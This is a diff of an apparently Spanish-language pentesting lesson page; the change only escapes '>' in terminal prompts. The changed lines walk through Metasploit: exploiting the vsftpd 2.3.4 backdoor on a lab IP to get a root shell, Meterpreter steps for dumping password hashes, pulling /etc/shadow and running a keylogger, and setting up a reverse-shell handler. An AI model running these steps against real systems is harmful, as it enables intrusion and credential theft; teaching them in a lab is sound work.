@@ -73,19 +73,19 @@
                 <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Comandos básicos de msfconsole</span></div>
                 <pre><code><span style="color:#00e676">$</span> msfconsole -q    <span style="color:#546e7a"># Iniciar sin banner (-q = quiet)</span>
 
-msf6 > <span style="color:#c792ea">search</span> vsftpd              <span style="color:#546e7a"># Buscar exploits</span>
-msf6 > <span style="color:#c792ea">search</span> type:exploit smb     <span style="color:#546e7a"># Buscar exploits de SMB</span>
-msf6 > <span style="color:#c792ea">use</span> exploit/unix/ftp/vsftpd_234_backdoor  <span style="color:#546e7a"># Seleccionar</span>
-msf6 > <span style="color:#c792ea">info</span>                        <span style="color:#546e7a"># Ver información del módulo</span>
-msf6 > <span style="color:#c792ea">show options</span>                <span style="color:#546e7a"># Ver opciones a configurar</span>
-msf6 > <span style="color:#c792ea">set</span> RHOSTS 10.0.2.15        <span style="color:#546e7a"># Configurar el objetivo</span>
-msf6 > <span style="color:#c792ea">set</span> LHOST 10.0.2.5          <span style="color:#546e7a"># Tu IP (para reverse shell)</span>
-msf6 > <span style="color:#c792ea">show payloads</span>               <span style="color:#546e7a"># Ver payloads compatibles</span>
-msf6 > <span style="color:#c792ea">set</span> PAYLOAD cmd/unix/interact
-msf6 > <span style="color:#c792ea">exploit</span>                     <span style="color:#546e7a"># ¡Lanzar el ataque!</span>
-msf6 > <span style="color:#c792ea">back</span>                        <span style="color:#546e7a"># Salir del módulo actual</span>
-msf6 > <span style="color:#c792ea">sessions</span>                    <span style="color:#546e7a"># Ver sesiones activas</span>
-msf6 > <span style="color:#c792ea">sessions -i 1</span>               <span style="color:#546e7a"># Interactuar con sesión 1</span></code></pre>
+msf6 &gt; <span style="color:#c792ea">search</span> vsftpd              <span style="color:#546e7a"># Buscar exploits</span>
+msf6 &gt; <span style="color:#c792ea">search</span> type:exploit smb     <span style="color:#546e7a"># Buscar exploits de SMB</span>
+msf6 &gt; <span style="color:#c792ea">use</span> exploit/unix/ftp/vsftpd_234_backdoor  <span style="color:#546e7a"># Seleccionar</span>
+msf6 &gt; <span style="color:#c792ea">info</span>                        <span style="color:#546e7a"># Ver información del módulo</span>
+msf6 &gt; <span style="color:#c792ea">show options</span>                <span style="color:#546e7a"># Ver opciones a configurar</span>
+msf6 &gt; <span style="color:#c792ea">set</span> RHOSTS 10.0.2.15        <span style="color:#546e7a"># Configurar el objetivo</span>
+msf6 &gt; <span style="color:#c792ea">set</span> LHOST 10.0.2.5          <span style="color:#546e7a"># Tu IP (para reverse shell)</span>
+msf6 &gt; <span style="color:#c792ea">show payloads</span>               <span style="color:#546e7a"># Ver payloads compatibles</span>
+msf6 &gt; <span style="color:#c792ea">set</span> PAYLOAD cmd/unix/interact
+msf6 &gt; <span style="color:#c792ea">exploit</span>                     <span style="color:#546e7a"># ¡Lanzar el ataque!</span>
+msf6 &gt; <span style="color:#c792ea">back</span>                        <span style="color:#546e7a"># Salir del módulo actual</span>
+msf6 &gt; <span style="color:#c792ea">sessions</span>                    <span style="color:#546e7a"># Ver sesiones activas</span>
+msf6 &gt; <span style="color:#c792ea">sessions -i 1</span>               <span style="color:#546e7a"># Interactuar con sesión 1</span></code></pre>
             </div>
         </div>
 
@@ -97,19 +97,19 @@ msf6 > <span style="color:#c792ea">sessions -i 1</span>               <span styl
             </p>
             <div class="lesson-terminal">
                 <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Explotar vsftpd 2.3.4 paso a paso</span></div>
-                <pre><code>msf6 > <span style="color:#c792ea">search</span> vsftpd
+                <pre><code>msf6 &gt; <span style="color:#c792ea">search</span> vsftpd
    0  exploit/unix/ftp/vsftpd_234_backdoor  <span style="color:#c3e88d">excellent</span>
 
-msf6 > <span style="color:#c792ea">use</span> 0
-msf6 exploit(vsftpd_234_backdoor) > <span style="color:#c792ea">show options</span>
+msf6 &gt; <span style="color:#c792ea">use</span> 0
+msf6 exploit(vsftpd_234_backdoor) &gt; <span style="color:#c792ea">show options</span>
 
    Name    Setting   Required  Description
    ----    -------   --------  -----------
    RHOSTS              yes     Target address
    RPORT   21          yes     Target port
 
-msf6 > <span style="color:#c792ea">set</span> RHOSTS 10.0.2.15
-msf6 > <span style="color:#c792ea">exploit</span>
+msf6 &gt; <span style="color:#c792ea">set</span> RHOSTS 10.0.2.15
+msf6 &gt; <span style="color:#c792ea">exploit</span>
 
 [*] 10.0.2.15:21 - Banner: 220 (vsFTPd 2.3.4)
 [*] 10.0.2.15:21 - USER: 331 Please specify the password.
@@ -137,19 +137,19 @@ uid=0(root) gid=0(root)
             </p>
             <div class="lesson-terminal">
                 <div class="term-header"><span class="dot red" aria-hidden="true"></span><span class="dot yellow" aria-hidden="true"></span><span class="dot green" aria-hidden="true"></span><span class="term-title">Comandos de Meterpreter</span></div>
-                <pre><code>meterpreter > <span style="color:#c792ea">sysinfo</span>           <span style="color:#546e7a"># Info del sistema</span>
-meterpreter > <span style="color:#c792ea">getuid</span>            <span style="color:#546e7a"># Tu usuario actual</span>
-meterpreter > <span style="color:#c792ea">hashdump</span>          <span style="color:#546e7a"># Extraer hashes de contraseñas</span>
-meterpreter > <span style="color:#c792ea">shell</span>             <span style="color:#546e7a"># Abrir shell del sistema</span>
-meterpreter > <span style="color:#c792ea">upload</span> /tmp/linpeas.sh /tmp/  <span style="color:#546e7a"># Subir archivos</span>
-meterpreter > <span style="color:#c792ea">download</span> /etc/shadow /tmp/    <span style="color:#546e7a"># Descargar archivos</span>
-meterpreter > <span style="color:#c792ea">ps</span>                <span style="color:#546e7a"># Listar procesos</span>
-meterpreter > <span style="color:#c792ea">migrate</span> 1234      <span style="color:#546e7a"># Migrar a otro proceso (persistencia)</span>
-meterpreter > <span style="color:#c792ea">keyscan_start</span>     <span style="color:#546e7a"># Iniciar keylogger</span>
-meterpreter > <span style="color:#c792ea">keyscan_dump</span>      <span style="color:#546e7a"># Ver teclas capturadas</span>
-meterpreter > <span style="color:#c792ea">screenshot</span>        <span style="color:#546e7a"># Captura de pantalla</span>
-meterpreter > <span style="color:#c792ea">portfwd add -l 3389 -p 3389 -r 10.0.2.20</span>  <span style="color:#546e7a"># Port forwarding</span>
-meterpreter > <span style="color:#c792ea">background</span>        <span style="color:#546e7a"># Enviar sesión a segundo plano</span></code></pre>
+                <pre><code>meterpreter &gt; <span style="color:#c792ea">sysinfo</span>           <span style="color:#546e7a"># Info del sistema</span>
+meterpreter &gt; <span style="color:#c792ea">getuid</span>            <span style="color:#546e7a"># Tu usuario actual</span>
+meterpreter &gt; <span style="color:#c792ea">hashdump</span>          <span style="color:#546e7a"># Extraer hashes de contraseñas</span>
+meterpreter &gt; <span style="color:#c792ea">shell</span>             <span style="color:#546e7a"># Abrir shell del sistema</span>
+meterpreter &gt; <span style="color:#c792ea">upload</span> /tmp/linpeas.sh /tmp/  <span style="color:#546e7a"># Subir archivos</span>
+meterpreter &gt; <span style="color:#c792ea">download</span> /etc/shadow /tmp/    <span style="color:#546e7a"># Descargar archivos</span>
+meterpreter &gt; <span style="color:#c792ea">ps</span>                <span style="color:#546e7a"># Listar procesos</span>
+meterpreter &gt; <span style="color:#c792ea">migrate</span> 1234      <span style="color:#546e7a"># Migrar a otro proceso (persistencia)</span>
+meterpreter &gt; <span style="color:#c792ea">keyscan_start</span>     <span style="color:#546e7a"># Iniciar keylogger</span>
+meterpreter &gt; <span style="color:#c792ea">keyscan_dump</span>      <span style="color:#546e7a"># Ver teclas capturadas</span>
+meterpreter &gt; <span style="color:#c792ea">screenshot</span>        <span style="color:#546e7a"># Captura de pantalla</span>
+meterpreter &gt; <span style="color:#c792ea">portfwd add -l 3389 -p 3389 -r 10.0.2.20</span>  <span style="color:#546e7a"># Port forwarding</span>
+meterpreter &gt; <span style="color:#c792ea">background</span>        <span style="color:#546e7a"># Enviar sesión a segundo plano</span></code></pre>
             </div>
         </div>
 
@@ -182,11 +182,11 @@ meterpreter > <span style="color:#c792ea">background</span>        <span style="
     LHOST=10.0.2.5 LPORT=4444 -o shell.py
 
 <span style="color:#546e7a"># Después, configura el handler en Metasploit:</span>
-msf6 > use exploit/multi/handler
-msf6 > set PAYLOAD linux/x86/meterpreter/reverse_tcp
-msf6 > set LHOST 10.0.2.5
-msf6 > set LPORT 4444
-msf6 > exploit
+msf6 &gt; use exploit/multi/handler
+msf6 &gt; set PAYLOAD linux/x86/meterpreter/reverse_tcp
+msf6 &gt; set LHOST 10.0.2.5
+msf6 &gt; set LPORT 4444
+msf6 &gt; exploit
 <span style="color:#546e7a"># Espera a que la víctima ejecute el payload...</span></code></pre>
             </div>
         </div>
